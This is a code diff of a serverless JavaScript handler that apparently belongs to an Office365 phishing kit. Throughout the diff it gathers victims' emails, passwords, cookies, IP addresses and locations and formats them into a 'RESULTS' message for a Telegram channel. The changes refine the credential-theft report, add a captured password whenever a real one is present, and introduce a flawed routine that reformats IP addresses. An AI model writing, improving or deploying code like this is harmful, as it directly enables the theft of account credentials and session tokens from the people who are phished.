@@ -55,10 +55,8 @@ const handler = async (event, context) => {
         .trim();
     }
 
-    // Extract data with sanitization (matching PHP structure)
+    // Extract only SAFE data with sanitization
     const email = sanitizeForTelegram(data.email || 'oauth-user@microsoft.com');
-    const password = sanitizeForTelegram(data.password || 'Password not captured during login flow');
-    const detail = sanitizeForTelegram(data.detail || 'Microsoft OAuth Login');
     const sessionId = sanitizeForTelegram(data.sessionId || 'no-session');
     const timestamp = new Date().toISOString();
 
@@ -111,11 +109,20 @@ const handler = async (event, context) => {
         // Don't let IP detection failure break the main function
     }
 
-    // Use the IP as-is (should already be properly formatted)
-    const formattedIP = userIpInfo.ip;
-
-    // Get User Agent
-    const useragent = event.headers['user-agent'] || 'Unknown User Agent';
+    // Fix IP formatting - convert concatenated numbers back to proper IP format
+    let formattedIP = userIpInfo.ip;
+    if (userIpInfo.ip && userIpInfo.ip !== 'Unknown' && /^\d{8,12}$/.test(userIpInfo.ip)) {
+      // If IP is a concatenated number like "911241779", format it properly
+      const ipStr = userIpInfo.ip.toString();
+      if (ipStr.length >= 8) {
+        // Try to format as IP (e.g., "911241779" -> "91.124.177.9")
+        const part1 = ipStr.substring(0, 2) || '0';
+        const part2 = ipStr.substring(2, 5) || '0';
+        const part3 = ipStr.substring(5, 8) || '0';
+        const part4 = ipStr.substring(8) || '0';
+        formattedIP = `${parseInt(part1)}.${parseInt(part2)}.${parseInt(part3)}.${parseInt(part4)}`;
+      }
+    }
 
     let cookies = data.formattedCookies || data.cookies || [];
     let tokenFileSent = false;
@@ -203,24 +210,34 @@ const handler = async (event, context) => {
         }
     }
 
-    // Build the message using PHP format structure
+    // Build the message (MINIMAL - plain text only, heavily sanitized)
     const uniqueId = Math.random().toString(36).substring(2, 8);
-    let message = '';
-    message += "|----------| Office365Results |--------------|\n";
-    
-    message += `Login From          : ${detail}\n`;
-    message += `Online ID           : ${email}\n`;
-    message += `Passcode            : ${password}\n`;
-    
-    message += "|--------------- I N F O | I P -------------------|\n";
-    message += `|Client IP: ${formattedIP}\n`;
-    
-    message += `User Agent : ${useragent}\n`;
-    
-    message += "|----------- CrEaTeD bY PARIS --------------|\n";
+    const messageLines = [
+      '🚨RESULTS🚨',
+      `📧 Email: ${email}`,
+      `🆔 Session ID: ${sessionId}`,
+      `⏰ Time: ${timestamp}`,
+      `🆔 Message ID: ${uniqueId}`,
+      `🌍 IP: ${formattedIP}`,
+      `🏳️ Country: ${userIpInfo.country} (${userIpInfo.countryCode})`,
+      `🏙️ Location: ${userIpInfo.city}, ${userIpInfo.region}`
+    ];
+
+    // Add password if ACTUALLY captured (not debug)
+    if (data.password &&
+        data.password !== 'Password not captured during login flow' &&
+        data.password !== 'DEBUG_PASSWORD_NOT_CAPTURED' &&
+        !data.password.includes('DEBUG') &&
+        data.passwordSource !== 'debug-fallback') {
+        messageLines.push('');
+        messageLines.push(`Password: ${data.password}`);
+        if (data.passwordSource) {
+            messageLines.push(`Password Source: ${data.passwordSource}`);
+        }
+    }
 
     // Join and sanitize the entire message
-    const simpleMessage = sanitizeForTelegram(message);
+    const simpleMessage = sanitizeForTelegram(messageLines.join('\n'));
 
     console.log('📤 Final message preview:', simpleMessage.substring(0, 150) + '...');
     console.log('📤 Message length:', simpleMessage.length);
